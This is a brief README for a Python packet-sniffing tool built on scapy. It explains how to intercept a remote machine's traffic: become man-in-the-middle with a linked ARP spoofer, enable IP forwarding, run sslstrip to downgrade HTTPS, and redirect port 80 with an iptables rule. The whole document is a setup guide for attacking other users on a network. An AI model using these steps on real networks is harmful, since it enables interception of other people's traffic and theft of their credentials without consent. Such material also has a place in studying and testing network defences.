#PACKET_sniffer

#Required python MODULES
scapy.all
scapy_http
optparse
argparse (for python3)

**NOTE: [HTTP sites]
If your using this tool to intercept and capture data form a remote machine then..
>Run ARP_spoofer, You have to be in the middle of the connect to intercept the RAW packets (https://github.com/gouthamk-cryptichub/ARP_spoofer to become MITM)
>IP forwarding should be enabled in your machine
    Open TERMINAL
    >echo 1 > /proc/sys/net/ipv4/ip_forward [ENTER]
    
[HTTPS sities]
>Run ARP_spoofer (https://github.com/gouthamk-cryptichub/ARP_spoofer)
>run sslstrip
OPEN TERMINAL
    >sslstrip
>OPEN NEW TERMINAL
    >iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
    >python sniff.py --help 
